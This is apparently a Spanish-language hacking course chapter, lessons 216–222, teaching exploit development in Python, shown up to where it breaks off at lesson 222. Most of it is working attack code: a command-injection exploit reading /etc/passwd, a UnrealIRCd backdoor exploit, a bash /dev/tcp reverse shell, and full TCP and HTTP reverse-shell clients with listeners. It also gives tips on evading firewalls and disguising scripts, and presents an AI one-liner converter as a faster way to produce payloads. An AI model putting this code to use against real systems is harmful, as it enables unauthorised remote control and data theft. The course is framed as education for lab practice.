| **Inicio**         | **atr√°s 4**                                                     | **Siguiente 6**                                                              |
| ------------------ | --------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./4_4_Analisis_de_vulnerabilidades_en_Hosts_con_Python.md) | [‚è©](./4_6_Python_Hacking_y_Explotacion_de_redes_informaticas_con_Python.md) |

---

## **√çndice**

| Temario                                                                                                                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------- |
| [216. Desarrollo de exploits con Python: Introducci√≥n](#216-desarrollo-de-exploits-con-python-introducci√≥n)                                 |
| [217. Desarrollo de exploits con Python: Ejecuci√≥n remota de comandos](#217-desarrollo-de-exploits-con-python-ejecuci√≥n-remota-de-comandos) |
| [218. Explota la vulnerabilidad de UnrealIRCd con Python](#218-explota-la-vulnerabilidad-de-unrealircd-con-python)                          |
| [219. Shell reversa TCP con Python](#219-shell-reversa-tcp-con-python)                                                                      |
| [220. Shell reversa HTTP con Python](#220-shell-reversa-http-con-python)                                                                    |
| [221. Convertidor One-liner con Inteligencia Artificial (IA)](#221-convertidor-one-liner-con-inteligencia-artificial-ia)                    |
| [222. Shell reversa cifrada (HTTPs) en Python](#222-shell-reversa-cifrada-https-en-python)                                                  |
| [223. Explota la vulnerabilidad UrealIRCd con una Shell cifrada](#223-explota-la-vulnerabilidad-urealircd-con-una-shell-cifrada)            |
| [224. Transferencia de ficheros con Python: HTTPServer](#224-transferencia-de-ficheros-con-python-httpserver)                               |
| [225. Explotaci√≥n del Kernel y elevaci√≥n de privilegios con Python](#225-explotaci√≥n-del-kernel-y-elevaci√≥n-de-privilegios-con-python)      |
| [226. PyMetasploit: Metasploit con Python](#226-pymetasploit-metasploit-con-python)                                                         |
| [227. PyMetasploit: Enumeraci√≥n y filtrado de m√≥dulos y exploits](#227-pymetasploit-enumeraci√≥n-y-filtrado-de-m√≥dulos-y-exploits)           |
| [228. PyMetasploit: Configuraci√≥n y ejecuci√≥n de exploits](#228-pymetasploit-configuraci√≥n-y-ejecuci√≥n-de-exploits)                         |
| [229. PyMetasploit: Manejo de sesiones](#229-pymetasploit-manejo-de-sesiones)                                                               |
| [230. Keylogger con Python](#230-keylogger-con-python)                                                                                      |
| [231. Compilar programas en Python: Pyinstaller](#231-compilar-programas-en-python-pyinstaller)                                             |

---

# **Python Hacking y Explotacion de Vulnerabilidades en Hosts con Python**

## **216. Desarrollo de exploits con Python: Introducci√≥n**

### üîê ¬øQu√© es el desarrollo de exploits?

#### üß† En t√©rminos simples:

Un **exploit** es un **programa o fragmento de c√≥digo** que aprovecha una **vulnerabilidad** (error o debilidad) en un sistema, software o servicio para conseguir algo **no autorizado**, como:

- Ejecutar comandos en el servidor
- Escalar privilegios (pasar de usuario normal a administrador)
- Acceder a datos sensibles
- Detener el funcionamiento del sistema

---

### üêç ¬øPor qu√© usar Python para desarrollar exploits?

Python es muy usado en ciberseguridad por:

‚úÖ Su **sintaxis simple**

‚úÖ Gran cantidad de **librer√≠as para redes y seguridad**

‚úÖ Compatible con muchas herramientas de pentesting

‚úÖ Ideal para **automatizar ataques** o escribir pruebas de concepto (PoC)

---

### üõ†Ô∏è ¬øQu√© necesito para comenzar?

#### ‚úÖ Requisitos previos:

- Conocimientos b√°sicos de Python
- Conocimientos b√°sicos de redes (IP, puertos, sockets)
- Entorno Linux (preferible Kali Linux o Parrot OS)

---

### üíª PASO A PASO: Instalaci√≥n del entorno

#### ‚úÖ 1. Instalar Python (si no lo tienes)

En Linux ya viene instalado. Verifica con:

```bash
python3 --version
```

Si no est√° instalado:

```bash
sudo apt update
sudo apt install python3 python3-pip
```

---

#### ‚úÖ 2. Crear un entorno de trabajo

Crea una carpeta para tus scripts:

```bash
mkdir exploits-python
cd exploits-python
```

Crea un entorno virtual (opcional pero recomendado):

```bash
python3 -m venv venv
source venv/bin/activate
```

---

#### ‚úÖ 3. Instalar herramientas/librer√≠as √∫tiles

```bash
pip install requests
pip install pwntools
pip install paramiko
pip install scapy
```

##### Explicaci√≥n de cada una:

- `requests`: para enviar peticiones HTTP
- `pwntools`: para explotar binarios, crear payloads, etc.
- `paramiko`: para explotar SSH
- `scapy`: para manipular paquetes de red

---

### üö® EJEMPLO 1: Exploit b√°sico en Python ‚Äì Petici√≥n maliciosa

**Objetivo:** Un servidor web vulnerable a inyecci√≥n de comandos a trav√©s de la URL.

#### Vulnerabilidad:

La URL permite ejecutar comandos sin validar la entrada del usuario:

```http
http://victima.com/vuln.php?cmd=ls
```

#### Exploit en Python:

```python
import requests

# URL del servidor vulnerable
url = "http://victima.com/vuln.php"

# Comando que queremos ejecutar en el servidor
cmd = "cat /etc/passwd"

# Enviar el comando como par√°metro
params = {"cmd": cmd}

# Realizar la solicitud
response = requests.get(url, params=params)

# Mostrar el resultado
print(response.text)
```

Este script hace que el servidor ejecute `cat /etc/passwd` y devuelve su contenido.

---

### üß™ EJEMPLO 2: Conexi√≥n reversa con socket

**Objetivo:** Que la v√≠ctima se conecte de vuelta al atacante y se le d√© una shell.

#### C√≥digo en la m√°quina atacante (listener):

```python
import socket
import subprocess

IP = "0.0.0.0"
PORT = 4444

s = socket.socket()
s.bind((IP, PORT))
s.listen(1)

print(f"[+] Esperando conexi√≥n en {PORT}...")
conn, addr = s.accept()
print(f"[+] Conexi√≥n recibida de {addr}")

while True:
    cmd = input("$ ")
    conn.send(cmd.encode())
    if cmd.lower() == "exit":
        break
    output = conn.recv(4096).decode()
    print(output)

conn.close()
```

##### C√≥digo que ejecuta la v√≠ctima (reverse shell):

```python
import socket
import subprocess

s = socket.socket()
s.connect(("IP_DEL_ATACANTE", 4444))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()
```

---

### ‚ö†Ô∏è IMPORTANTE

Este tipo de scripts deben usarse **solo con fines educativos** o en **entornos de laboratorio controlado** como:

- M√°quinas virtuales con vulnerabilidades (ej. Metasploitable)
- Plataformas de pr√°ctica como [TryHackMe](https://tryhackme.com), [Hack The Box](https://www.hackthebox.com)

**Jam√°s pruebes esto en servidores reales sin permiso.**

---

### üß∞ ¬øQu√© puedes aprender despu√©s?

- C√≥mo funciona el protocolo HTTP, TCP, UDP
- T√©cnicas de **fuzzing** para encontrar vulnerabilidades
- Desbordamiento de b√∫fer (buffer overflow)
- Explotaci√≥n de binarios con `pwntools` y GDB
- Evasi√≥n de antivirus
- Ingenier√≠a inversa

---

### üéì Recursos recomendados

1. **Libro**: "Violent Python" ‚Äì Tiene muchos ejemplos pr√°cticos
2. **Curso**: "Python for Pentesters" en Udemy o YouTube
3. **Docs**:

   - [https://docs.pwntools.com/en/latest/](https://docs.pwntools.com/en/latest/)
   - [https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)

---

### ‚úÖ Resumen

| Tema                | Explicaci√≥n corta                                |
| ------------------- | ------------------------------------------------ |
| ¬øQu√© es un exploit? | C√≥digo que aprovecha un fallo para tomar control |
| ¬øPor qu√© Python?    | Sencillo, potente, muchas librer√≠as de seguridad |
| Herramientas clave  | requests, pwntools, scapy, paramiko              |
| Primer ejemplo      | Enviar comandos a un servidor vulnerable via URL |
| Segundo ejemplo     | Reverse shell usando sockets                     |
| D√≥nde practicar     | TryHackMe, Hack The Box, M√°quinas virtuales      |

---

[üîº](#√≠ndice)

---

## **217. Desarrollo de exploits con Python: Ejecuci√≥n remota de comandos**

### üîç ¬øQu√© es la Ejecuci√≥n Remota de Comandos (RCE)?

#### üß† Definici√≥n:

La **Ejecuci√≥n Remota de Comandos (Remote Command Execution - RCE)** es una vulnerabilidad que permite a un atacante **ejecutar comandos arbitrarios** en un servidor o sistema **remoto**, normalmente a trav√©s de una aplicaci√≥n web vulnerable.

#### ‚ö†Ô∏è ¬øQu√© puede hacer un atacante con RCE?

- Ver archivos sensibles (como `/etc/passwd`)
- Descargar malware
- Escalar privilegios
- Crear shells reversas
- Control total del servidor

---

### üí° ¬øC√≥mo se da una RCE?

La aplicaci√≥n web:

- Recibe comandos del usuario
- Los ejecuta en el sistema sin **sanitizar** ni validar correctamente

Ejemplo de una URL vulnerable:

```http
http://victima.com/ejecutar.php?cmd=ls
```

---

### üêç ¬øPor qu√© usar Python para explotar RCE?

- Automatiza ataques
- Permite interactuar con el servidor f√°cilmente (requests, sockets)
- Facilita payloads complejos (reverse shell, exfiltraci√≥n de datos)

---

### üõ†Ô∏è Preparaci√≥n del entorno

#### üîß 1. Requisitos previos:

- Python 3 instalado
- Kali Linux, Parrot OS o cualquier Linux
- Biblioteca `requests` instalada

```bash
pip install requests
```

---

#### üöß Escenario Simulado

Supongamos que tienes acceso a una aplicaci√≥n web con esta URL:

```
http://10.0.0.5/vuln.php?cmd=whoami
```

#### Lo que pasa detr√°s:

- El servidor toma el valor de `cmd` y lo ejecuta directamente en la terminal del sistema.
- Si no filtra la entrada, podemos enviar cualquier comando de Linux.

---

### üíª Paso a paso: Crear un exploit en Python

#### üêç C√≥digo del exploit b√°sico (GET)

```python
import requests

# URL del servidor vulnerable
url = "http://10.0.0.5/vuln.php"

while True:
    cmd = input("Comando> ")
    if cmd.lower() in ["exit", "quit"]:
        break

    # Enviamos el comando como par√°metro
    try:
        res = requests.get(url, params={"cmd": cmd}, timeout=5)
        print(res.text)
    except requests.exceptions.RequestException:
        print("[!] Error al conectar con el objetivo")
```

#### üìå ¬øQu√© hace este script?

1. Pide un comando al usuario
2. Lo env√≠a como par√°metro `cmd` a la URL
3. Imprime la respuesta del servidor (output del comando)

---

### üí£ Ejemplo de comandos √∫tiles

| Comando               | Descripci√≥n                 |
| --------------------- | --------------------------- |
| `whoami`              | Muestra el usuario actual   |
| `ls -la`              | Lista archivos              |
| `cat /etc/passwd`     | Ver archivo de usuarios     |
| `curl http://IP:PORT` | Contacta tu equipo atacante |

---

### üêö Reverse Shell (Payload para obtener acceso total)

#### üëæ Objetivo:

Lograr que el servidor se conecte de vuelta a **tu m√°quina** y te d√© una **shell interactiva**.

#### üíª Tu m√°quina (atacante)

```bash
nc -lvnp 4444
```

#### üë®‚Äçüíª Enviar este comando a trav√©s del exploit:

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

> Reemplaza `10.0.0.1` con tu IP local.

---

### üõ°Ô∏è ¬øC√≥mo prevenir RCE?

(Solo como nota educativa)

- Nunca uses `eval()`, `exec()` o `system()` con datos del usuario
- Sanitiza entradas (filtros de comandos, expresiones regulares)
- Usa listas blancas de comandos permitidos
- Configura correctamente permisos del sistema

---

### üß™ Laboratorio pr√°ctico con DVWA (opcional)

Puedes usar [DVWA](https://github.com/digininja/DVWA) (Damn Vulnerable Web Application) para practicar en local.

Pasos b√°sicos:

1. Instala XAMPP o Docker
2. Clona el repositorio de DVWA
3. Configura el archivo `config.inc.php`
4. Abre en tu navegador `http://localhost/DVWA`
5. Accede a la secci√≥n **Command Injection**

---

### ‚úÖ RESUMEN

| Concepto      | Explicaci√≥n breve                         |
| ------------- | ----------------------------------------- |
| RCE           | Ejecutar comandos en un servidor remoto   |
| Python        | Ideal para automatizar el ataque          |
| Exploit       | Enviar comandos por URL usando `requests` |
| Reverse Shell | Tomar control remoto del sistema          |
| Prevenci√≥n    | Sanitizar entradas, limitar permisos      |

---

[üîº](#√≠ndice)

---

## **218. Explota la vulnerabilidad de UnrealIRCd con Python**

### üéØ ¬øQu√© es UnrealIRCd?

UnrealIRCd es un servidor de IRC (Internet Relay Chat), que permite crear y administrar canales de chat. En versiones antiguas, particularmente la **3.2.8.1**, hubo una vulnerabilidad cr√≠tica.

---

### üî• ¬øQu√© vulnerabilidad ten√≠a UnrealIRCd 3.2.8.1?

La versi√≥n **UnrealIRCd 3.2.8.1** descargada desde un **mirror comprometido** en 2009 conten√≠a **una puerta trasera (backdoor)** incrustada en el binario.

> Esta backdoor permit√≠a ejecutar comandos remotos en el servidor usando una conexi√≥n TCP en el puerto IRC (por defecto 6667), enviando comandos especiales como si fueran parte del protocolo IRC.

---

### üí£ ¬øC√≥mo funciona la explotaci√≥n?

Un atacante puede conectarse al servidor y enviar un comando IRC especial como:

```
AB; comando_a_ejecutar
```

Esto ejecuta el `comando_a_ejecutar` en el sistema del servidor con permisos del usuario que corre el UnrealIRCd.

Ejemplo:

```
AB;uname -a
```

> Este comando ejecutar√° `uname -a` y mostrar√° la informaci√≥n del sistema operativo del servidor remoto.

---

### üß™ Entorno de prueba (Legal y √âtico)

Si lo haces con fines educativos, te recomiendo crear un laboratorio con:

1. **M√°quina vulnerable**:

   - Puedes usar **Metasploitable 2**, que ya trae UnrealIRCd vulnerable instalado.
   - O montar tu propia VM con Linux e instalar UnrealIRCd 3.2.8.1 (desde el paquete comprometido original ‚Äî ¬°solo en entorno controlado!).

2. **Atacante (Kali Linux o similar)**:

   - Desde Kali puedes correr el exploit en Python o usar Metasploit.

---

### üìú C√≥digo Python para explotar la vulnerabilidad

Este es un ejemplo **did√°ctico** de c√≥mo funcionar√≠a un script simple en Python para explotar esta puerta trasera:

```python
import socket
import sys

def exploit_unrealircd(target_ip, target_port, command):
    payload = f"AB;{command}\n"

    try:
        print(f"[+] Conectando a {target_ip}:{target_port}...")
        s = socket.socket()
        s.connect((target_ip, target_port))
        print("[+] Conectado. Enviando payload...")
        s.send(payload.encode())
        print("[+] Payload enviado.")
        s.close()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Uso: {sys.argv[0]} <IP> <PUERTO> <COMANDO>")
        print(f"Ejemplo: {sys.argv[0]} 192.168.1.10 6667 'id'")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    cmd = sys.argv[3]

    exploit_unrealircd(ip, port, cmd)
```

#### ‚úÖ Ejemplo de uso

```bash
python3 exploit_unrealircd.py 192.168.56.101 6667 "id"
```

Esto enviar√° el comando `id` al servidor IRC y, si es vulnerable, lo ejecutar√°.

---

### üîß C√≥mo instalar UnrealIRCd 3.2.8.1 en entorno de prueba

‚ö†Ô∏è Repetimos: ¬°Solo en entornos legales!

1. Crear una VM con Ubuntu 8 o Debian antiguo.
2. Descargar el binario infectado:

```bash
wget http://downloads.sourceforge.net/project/unrealircd/Unreal3.2/unreal3.2.8.1.tar.gz
tar -zxvf unreal3.2.8.1.tar.gz
cd Unreal3.2.8.1
./Config
make
```

3. Correr el servidor:

```bash
./unreal start
```

Esto lo iniciar√° en el puerto 6667.

---

### üß∑ Medidas de prevenci√≥n

- No usar software desactualizado.
- Verificar los **hashes** de archivos descargados.
- Usar IDS/IPS y monitoreo de red.
- Limitar acceso remoto al servidor IRC.

---

### ‚úÖ Recomendaci√≥n final

Si est√°s aprendiendo sobre seguridad inform√°tica, te recomiendo:

- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [TryHackMe - Intro to Exploits](https://tryhackme.com)
- [Hack The Box](https://hackthebox.com)

---

[üîº](#√≠ndice)

---

## **219. Shell reversa TCP con Python**

### ‚úÖ ¬øQu√© es una reverse shell?

Una **reverse shell** es una t√©cnica en la que una **m√°quina v√≠ctima (cliente)** establece una conexi√≥n hacia una **m√°quina atacante (servidor)** para que esta √∫ltima pueda ejecutar comandos de forma remota.

---

#### üéØ ¬øPara qu√© sirve?

Sirve para obtener **acceso remoto** a una m√°quina, por ejemplo, despu√©s de haber explotado una vulnerabilidad. Es un paso com√∫n en **pentesting** o pruebas de intrusi√≥n.

---

### üß† ¬øC√≥mo funciona?

1. **La m√°quina atacante (escucha)** con un servidor TCP.
2. **La v√≠ctima se conecta** a la m√°quina atacante y redirige su entrada/salida de comandos.
3. El atacante puede ejecutar comandos en la m√°quina v√≠ctima como si estuviera en su terminal.

---

### üß™ Entorno de pruebas (seguro y legal)

#### Puedes usar:

| M√°quina       | Rol      | Recomendaci√≥n                |
| ------------- | -------- | ---------------------------- |
| Kali Linux    | Atacante | Kali en VirtualBox o VMware  |
| Ubuntu/Debian | V√≠ctima  | M√°quina virtual sin firewall |

üí° Ambas m√°quinas deben estar en **la misma red local o virtual** (por ejemplo, en modo **red interna** de VirtualBox).

---

### üêç C√≥digo Python: Reverse Shell

#### üîÅ Cliente (V√≠ctima) - Se conecta al atacante

```python
# reverse_shell_client.py
import socket
import subprocess
import os

def reverse_shell():
    host = '192.168.1.10'  # IP del atacante
    port = 4444            # Puerto de escucha

    s = socket.socket()
    try:
        s.connect((host, port))
        s.send(b'[+] Conectado a la shell\n')
        while True:
            comando = s.recv(1024).decode()
            if comando.lower() == 'exit':
                break
            if comando.startswith('cd '):
                try:
                    os.chdir(comando[3:].strip())
                    s.send(b'Directorio cambiado\n')
                except Exception as e:
                    s.send(f'Error: {str(e)}\n'.encode())
            else:
                resultado = subprocess.getoutput(comando)
                s.send((resultado + '\n').encode())
        s.close()
    except Exception as e:
        print(f"[!] Error al conectar: {e}")

if __name__ == '__main__':
    reverse_shell()
```

---

#### üîä Servidor (Atacante) - Escucha y controla

```python
# listener_server.py
import socket

def servidor():
    host = '0.0.0.0'  # Escuchar en todas las interfaces
    port = 4444

    s = socket.socket()
    s.bind((host, port))
    s.listen(1)
    print(f"[+] Escuchando en el puerto {port}...")

    cliente, direccion = s.accept()
    print(f"[+] Conexi√≥n desde {direccion}")

    while True:
        comando = input("Shell> ")
        if comando.strip() == '':
            continue
        cliente.send(comando.encode())
        if comando.lower() == 'exit':
            break
        resultado = cliente.recv(4096).decode()
        print(resultado)

    cliente.close()
    s.close()

if __name__ == '__main__':
    servidor()
```

---

### üì¶ ¬øC√≥mo instalar y correr?

#### Paso 1: Prepara las m√°quinas

1. **M√°quina Atacante (Kali o cualquier Linux):**

   - IP: `192.168.1.10` (aj√∫stalo seg√∫n tu red)
   - Guarda `listener_server.py`
   - Ejecuta:

     ```bash
     python3 listener_server.py
     ```

2. **M√°quina V√≠ctima (Ubuntu o Windows):**

   - Guarda `reverse_shell_client.py`
   - Modifica `host` en el script con la IP del atacante.
   - Ejecuta:

     ```bash
     python3 reverse_shell_client.py
     ```

üìå **Importante:** Aseg√∫rate de que no haya firewalls bloqueando el puerto 4444.

---

### üé¨ Ejemplo de ejecuci√≥n

#### 1. En la m√°quina atacante:

```bash
$ python3 listener_server.py
[+] Escuchando en el puerto 4444...
[+] Conexi√≥n desde ('192.168.1.15', 52766)
Shell> whoami
victima
Shell> uname -a
Linux ubuntu 5.15.0-91-generic ...
```

#### 2. En la m√°quina v√≠ctima:

```bash
# No muestra nada, queda en espera mientras el atacante controla
```

---

### ‚ö†Ô∏è Seguridad y Legalidad

- **Nunca ejecutes esto en redes p√∫blicas o sin permiso.**
- Solo en laboratorios controlados y para prop√≥sitos de aprendizaje.
- ¬°No lo uses contra sistemas que no te pertenecen!

---

### üöÄ Nivel avanzado (opcional)

Puedes mejorar esto:

- Enviar resultados en chunks grandes (usando bucle `recv()`).
- Encriptar la comunicaci√≥n (con `ssl`).
- Usar `threading` para m√∫ltiples clientes.
- Camuflar el script como programa leg√≠timo (para estudios de malware).

---

[üîº](#√≠ndice)

---

## **220. Shell reversa HTTP con Python**

![HTTP](../img/4_Python_Hacking_Ciberseguridad_y_Hacking_Etico_con_Python/HTTP.webp "HTTP")

### üéØ ¬øQu√© es una reverse shell HTTP?

Una **reverse shell HTTP** es una variante de la shell reversa cl√°sica, pero que se comunica a trav√©s del **protocolo HTTP** en lugar de usar una conexi√≥n TCP directa.

---

#### üîç ¬øPor qu√© usar HTTP?

- Muchas redes permiten salir al exterior por el puerto **80 o 443 (HTTP/HTTPS)**.
- Es m√°s f√°cil evadir firewalls o IDS, porque **parece tr√°fico web normal**.
- Puedes ocultar el tr√°fico como si fuera una petici√≥n web leg√≠tima.

---

### üß™ Entorno de laboratorio (seguro y legal)

| M√°quina                  | Rol                     | Descripci√≥n                                |
| ------------------------ | ----------------------- | ------------------------------------------ |
| Kali Linux (atacante)    | Servidor web + listener | Recibe las peticiones HTTP                 |
| Ubuntu/Windows (v√≠ctima) | Cliente                 | Ejecuta el script y se conecta al servidor |

‚úÖ Ambas m√°quinas deben estar en la misma red (real o virtual).

---

### üß† ¬øC√≥mo funciona una reverse shell HTTP?

1. **La v√≠ctima (cliente)** hace una petici√≥n HTTP al servidor atacante.
2. El servidor responde con un **comando a ejecutar**.
3. La v√≠ctima ejecuta ese comando y **env√≠a la respuesta como POST**.
4. El servidor recibe la respuesta y espera otra petici√≥n.

Este ciclo se repite continuamente como si fuera un chat entre atacante y v√≠ctima, todo por HTTP.

---

### ‚öôÔ∏è Implementaci√≥n

Vamos a crear:

1. Un **servidor HTTP** (en la m√°quina atacante).
2. Un **cliente reverse shell HTTP** (en la m√°quina v√≠ctima).

---

#### üñ•Ô∏è 1. Servidor HTTP (atacante)

```python
# http_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

comando_a_enviar = "whoami"

class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(comando_a_enviar.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("[+] Respuesta de la v√≠ctima:")
        print(post_data.decode())
        self.send_response(200)
        self.end_headers()

def run_server():
    server_address = ('0.0.0.0', 8000)  # Cambia puerto si es necesario
    httpd = HTTPServer(server_address, ShellHandler)
    print("[+] Servidor HTTP escuchando en el puerto 8000...")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

üîÅ Puedes editar la variable `comando_a_enviar` para enviar otros comandos.

---

#### üêç 2. Cliente HTTP (v√≠ctima)

```python
# http_client.py
import requests
import subprocess
import time

server_url = "http://192.168.1.10:8000"  # IP del atacante

while True:
    try:
        r = requests.get(server_url)
        comando = r.text.strip()
        if comando.lower() == "exit":
            break

        resultado = subprocess.getoutput(comando)
        print(f"[+] Resultado de '{comando}':\n{resultado}")

        requests.post(server_url, data=resultado.encode())

    except Exception as e:
        print(f"[!] Error: {e}")

    time.sleep(5)
```

‚úÖ Este script:

- Se conecta al servidor cada 5 segundos.
- Recibe un comando.
- Lo ejecuta.
- Devuelve el resultado al servidor.

---

### üîß Instalaci√≥n y prueba paso a paso

#### En la m√°quina **atacante** (servidor)

1. Guarda `http_server.py`
2. Instala dependencias si no tienes:

   ```bash
   sudo apt install python3
   ```

3. Ejecuta:

   ```bash
   python3 http_server.py
   ```

4. Edita el script y cambia `comando_a_enviar` a comandos como `"ls"`, `"id"`, `"uname -a"`, etc.

---

#### En la m√°quina **v√≠ctima** (cliente)

1. Guarda `http_client.py`
2. Aseg√∫rate de tener:

   ```bash
   pip3 install requests
   ```

3. Edita la IP del atacante en `server_url`
4. Ejecuta:

   ```bash
   python3 http_client.py
   ```

---

#### Ejemplo de resultado

##### Servidor (atacante):

```
[+] Servidor HTTP escuchando en el puerto 8000...
[+] Respuesta de la v√≠ctima:
kali
```

##### Cliente (v√≠ctima):

```
[+] Resultado de 'whoami':
kali
```

---

#### ‚ö†Ô∏è Seguridad y legalidad

- Esto es solo para **laboratorios de estudio**.
- Nunca lo uses en redes externas o m√°quinas sin permiso.
- Puedes practicar en plataformas como **TryHackMe**, **HackTheBox**, o tu propio laboratorio con **VirtualBox o VMware**.

---

[üîº](#√≠ndice)

---

## **221. Convertidor One-liner con Inteligencia Artificial (IA)**

### üß† ¬øQu√© es un ‚Äúconvertidor one-liner con IA‚Äù?

Un **one-liner** es una instrucci√≥n o script de **una sola l√≠nea** que realiza una tarea √∫til en la terminal o en un lenguaje como Python, Bash o PowerShell.

Un **convertidor con IA** interpreta un one-liner (ej: en Bash) y lo convierte en otra cosa:

- ‚úÖ Traducci√≥n de Bash ‚Üí Python
- ‚úÖ Traducci√≥n de Python ‚Üí PowerShell
- ‚úÖ Explicaci√≥n en lenguaje natural de qu√© hace el comando
- ‚úÖ Generaci√≥n de un one-liner a partir de una descripci√≥n

---

### üéØ ¬øPara qu√© sirve?

Esto es muy √∫til en:

| Uso com√∫n      | Ejemplo                                          |
| -------------- | ------------------------------------------------ |
| Pentesting     | Convertir payloads de Bash a Python o PowerShell |
| Automatizaci√≥n | Crear tareas de red, archivos, procesos          |
| Estudio        | Aprender shell scripting o debugging             |
| Traducci√≥n     | Explicar qu√© hace un comando desconocido         |

---

### üß™ Ejemplo b√°sico

#### üîπ One-liner en Bash:

```bash
find / -name "passwd" 2>/dev/null
```

‚úÖ Este comando busca el archivo `passwd` en todo el sistema.

### üîÑ IA lo convierte a Python:

```python
import os

for root, dirs, files in os.walk('/'):
    if 'passwd' in files:
        print(os.path.join(root, 'passwd'))
```

---

### ü§ñ ¬øC√≥mo hacer un convertidor one-liner con IA?

Puedes construirlo con estas herramientas:

#### üõ†Ô∏è Requisitos

1. Python 3.x
2. API de una IA como OpenAI (usaremos GPT)
3. Interfaz por terminal o web (opcional)
4. Algunas bibliotecas:

   - `openai`
   - `argparse` o `flask` (seg√∫n el enfoque)

---

### üß± Paso a paso: crear un convertidor one-liner con IA (modo terminal)

#### üì¶ 1. Instalar dependencias

```bash
pip install openai
```

#### üîë 2. Obtener API Key

- Ve a [https://platform.openai.com](https://platform.openai.com)
- Crea una cuenta y consigue una API key
- Gu√°rdala como variable de entorno:

```bash
export OPENAI_API_KEY="tu_api_key_aqu√≠"
```

---

#### üßæ 3. Script completo en Python

```python
# one_liner_converter.py
import openai
import os
import argparse

openai.api_key = os.getenv("OPENAI_API_KEY")

def convertir_one_liner(one_liner, modo):
    prompt = ""

    if modo == "explicar":
        prompt = f"Explica este comando en lenguaje simple:\n{one_liner}"
    elif modo == "bash2python":
        prompt = f"Convierte este comando bash a Python:\n{one_liner}"
    elif modo == "python2bash":
        prompt = f"Convierte este c√≥digo Python a un one-liner en bash:\n{one_liner}"
    else:
        print("Modo no soportado.")
        return

    response = openai.ChatCompletion.create(
        model="gpt-3.5-turbo",
        messages=[
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )

    resultado = response['choices'][0]['message']['content']
    print("\nüîÑ Resultado:")
    print(resultado)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Convertidor de one-liners con IA")
    parser.add_argument("modo", help="Modo: explicar / bash2python / python2bash")
    parser.add_argument("comando", help="Comando o c√≥digo a convertir", nargs='+')

    args = parser.parse_args()
    comando_texto = " ".join(args.comando)
    convertir_one_liner(comando_texto, args.modo)
```

---

#### ‚úÖ 4. C√≥mo usarlo

##### üîç Para explicar:

```bash
python3 one_liner_converter.py explicar 'ls -la /home'
```

##### üîÅ Para convertir Bash a Python:

```bash
python3 one_liner_converter.py bash2python 'cat /etc/passwd | grep root'
```

##### üîÅ Para convertir Python a Bash:

```bash
python3 one_liner_converter.py python2bash 'print(open("/etc/passwd").read())'
```

---

### üß™ ¬øC√≥mo probarlo en tu laboratorio?

#### Entorno recomendado:

- ‚úÖ Kali Linux o Ubuntu
- ‚úÖ Python 3 instalado
- ‚úÖ Acceso a Internet (para conectarse a OpenAI)
- ‚úÖ Cuenta en OpenAI con API Key v√°lida

---

### üöÄ Extensi√≥n: Convertidor One-liner con Interfaz Web (Flask)

Si quieres ir m√°s all√°, puedes crear una app web con Flask:

```bash
pip install flask
```

```python
# app.py
from flask import Flask, request, render_template_string
import openai
import os

openai.api_key = os.getenv("OPENAI_API_KEY")
app = Flask(__name__)

HTML = """
<form method="post">
    <input type="text" name="cmd" placeholder="Escribe el one-liner" style="width:300px;">
    <select name="modo">
        <option value="explicar">Explicar</option>
        <option value="bash2python">Bash a Python</option>
        <option value="python2bash">Python a Bash</option>
    </select>
    <button type="submit">Convertir</button>
</form>
<pre>{{ resultado }}</pre>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    resultado = ""
    if request.method == "POST":
        cmd = request.form["cmd"]
        modo = request.form["modo"]
        prompt = f"{modo}: {cmd}"
        if modo == "explicar":
            prompt = f"Explica este comando:\n{cmd}"
        elif modo == "bash2python":
            prompt = f"Convierte de bash a python:\n{cmd}"
        elif modo == "python2bash":
            prompt = f"Convierte de python a bash:\n{cmd}"

        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[{"role": "user", "content": prompt}]
        )
        resultado = response['choices'][0]['message']['content']

    return render_template_string(HTML, resultado=resultado)

app.run(debug=True)
```

Abres en tu navegador:
üëâ [http://127.0.0.1:5000](http://127.0.0.1:5000)

---

### ‚úÖ ¬øQu√© puedes lograr?

| Objetivo                    | Resultado                               |
| --------------------------- | --------------------------------------- |
| Aprender scripting          | Entiendes f√°cilmente comandos complejos |
| Hacer pentesting m√°s fluido | Generas payloads m√°s r√°pido             |
| Documentar tareas           | Generas explicaciones autom√°ticas       |
| Traducir herramientas       | Bash ‚Üî Python ‚Üî PowerShell              |

---

### üìå Resumen final

- Puedes usar IA (como GPT) para convertir, explicar o generar one-liners.
- Este sistema te ayuda a **automatizar tareas comunes** y mejorar tus scripts.
- Todo esto puede montarse con Python + API + terminal o Flask.
- Funciona en entornos locales de prueba como Kali, Ubuntu, WSL o contenedores Docker.

---

[üîº](#√≠ndice)

---

## **222. Shell reversa cifrada (HTTPs) en Python**

![HTTPS](../img/4_Python_Hacking_Ciberseguridad_y_Hacking_Etico_con_Python/https.jpg "HTTPS")

### üß† ¬øQu√© es una shell reversa cifrada (HTTPS)?

Una **reverse shell cifrada** es como una shell remota normal, pero:

1. La m√°quina **v√≠ctima (cliente)** se conecta al atacante por HTTPS.
2. El tr√°fico viaja cifrado con **SSL/TLS** (como cuando visitas un sitio web seguro).
3. El servidor devuelve comandos a ejecutar.
4. La v√≠ctima ejecuta los comandos y **env√≠a la salida cifrada** de vuelta al servidor.

üîê As√≠ nadie puede leer o alterar f√°cilmente los comandos o resultados en tr√°nsito.

---

### üß™ ¬øD√≥nde practicar esto?

Puedes probar todo en un **laboratorio local**, por ejemplo:

